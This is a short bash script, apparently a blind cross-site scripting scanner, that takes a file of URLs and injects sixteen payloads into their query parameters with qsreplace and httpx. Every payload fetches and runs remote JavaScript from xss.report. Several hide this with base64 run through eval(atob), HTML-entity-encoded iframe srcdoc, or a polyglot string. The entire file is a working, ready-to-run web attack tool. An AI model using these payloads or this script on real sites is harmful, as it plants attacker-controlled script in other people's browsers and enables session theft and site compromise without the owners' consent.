#!/bin/bash

# Usage: ./bxsser urls_with_params.txt

if [ -z "$1" ]; then
echo "Usage: $0 urls_with_params.txt"
exit 1
fi

URLS=$1

PAYLOADS=(
'"><script src=https://xss.report/c/YOUR-USERNAME></script>'
'"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL1lPVVItVVNFUk5BTUUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>'
'javascript:eval('''var a=document.createElement("script");a.src="https://xss.report/c/YOUR-USERNAME";document.body.appendChild(a)'\'')'
'"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL1lPVVItVVNFUk5BTUUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>'
'"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL1lPVVItVVNFUk5BTUUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>'
'"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;xss.report/c/YOUR-USERNAME&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">'
'<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/YOUR-USERNAME");a.send();</script>'
'<script>$.getScript("//xss.report/c/YOUR-USERNAME")</script>'
'var a=document.createElement("script");a.src="https://xss.report/c/YOUR-USERNAME";document.body.appendChild(a);'
'javascript:"/*'''/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg/*/onload=(import(/https:\xss.report\c\YOUR-USERNAME/.source))//>'
'<svg onload="javascript:eval('''var a=document.createElement("script");a.src="https://xss.report/c/YOUR-USERNAME";document.body.appendChild(a)'\'')" />'
'<iframe src="javascript:var a=document.createElement('\''script'\'');a.src='\''https://xss.report/c/YOUR-USERNAME'\'';document.body.appendChild(a)"></iframe>'
'<div onmouseover="var a=document.createElement('\''script'\'');a.src='\''https://xss.report/c/YOUR-USERNAME'\'';document.body.appendChild(a)">Hover me</div>'
'<audio src="x" onerror="var a=document.createElement('\''script'\'');a.src='\''https://xss.report/c/YOUR-USERNAME'\'';document.body.appendChild(a)">'
'<body onload="var a=document.createElement('\''script'\'');a.src='\''https://xss.report/c/YOUR-USERNAME'\'';document.body.appendChild(a)">'
'<script>fetch("//xss.report/c/YOUR-USERNAME").then(r=>r.text()).then(t=>eval(t))</script>'
)

while read -r url; do
echo "[*] Testing: $url"
for payload in "${PAYLOADS[@]}"; do
echo "$url" | qsreplace "$payload" | httpx -silent > /dev/null
done
done < "$URLS"
